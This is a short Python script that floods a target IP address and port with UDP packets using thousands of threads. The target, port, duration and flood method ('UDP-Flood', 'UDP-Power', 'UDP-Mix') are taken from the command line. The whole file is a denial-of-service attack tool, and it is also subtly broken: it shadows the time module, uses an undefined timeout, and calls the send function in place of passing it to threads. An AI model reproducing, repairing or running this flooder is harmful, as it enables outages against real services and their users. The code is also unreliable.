import sys
import socket
import threading
import time

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
method = str(sys.argv[4])

loops = 10000

def send_packet(amplifier):
    try:
        time.time() > timeout
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(ip), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def attack_HQ():
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), args=(ip,port,time)).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750), args=(ip,port,time)).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), args=(ip,port,time)).start()
            threading.Thread(target=send_packet(750), args=(ip,port,time)).start()

attack_HQ()
